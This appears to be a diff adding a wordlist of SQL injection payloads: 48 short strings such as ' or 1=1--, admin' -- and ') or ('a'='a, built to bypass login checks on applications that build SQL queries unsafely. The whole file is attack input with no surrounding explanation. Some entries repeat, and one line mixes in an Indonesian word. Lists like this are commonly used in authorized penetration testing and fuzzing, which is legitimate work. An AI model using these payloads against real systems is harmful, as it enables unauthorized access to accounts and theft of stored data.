@@ -1,0 +1,48 @@
+' or '1
+' or ''='
+' or 1=1--
+' or 1=1 limit 1 -- -+
+'=' 'or'
+'=''or' atau '=' 'or'
+1' or 1=1 -- -
+1') and '1'='1--
+1 ‘or’ 1 ‘=’ 1
+1' or 1=1 -- -
+admin' #
+admin' --
+admin'/*
+and 1=1
+and 1=1--
+' and 'one'='one
+' and 'one'='one--
+hi" or 1=1 --
+hi' or 1=1 --
+hi" or "a"="a
+' or ''='
+'=''OR'
+" or 0=0 #
+" or 0=0 --
+' or 0=0 #
+' or 0=0 --
+or 0=0 #
+or 0=0 --
+' or '1
+" or 1=1--
+' or '1'='1
+' or 1=1--
+'or'1=1'
+) or '1'='1--
+) or ('1'='1--
+or 1=1#
+or 1=1--
+or 1=1/*
+' or 1=1 limit 1 -- -+
+" or "a"="a
+") or ("a"="a
+' or a=a--
+') or ('a'='a
+' or 'one'='one
+' or 'one'='one--
+" or "x"="x
+' or 'x'='x
+') or ('x'='x
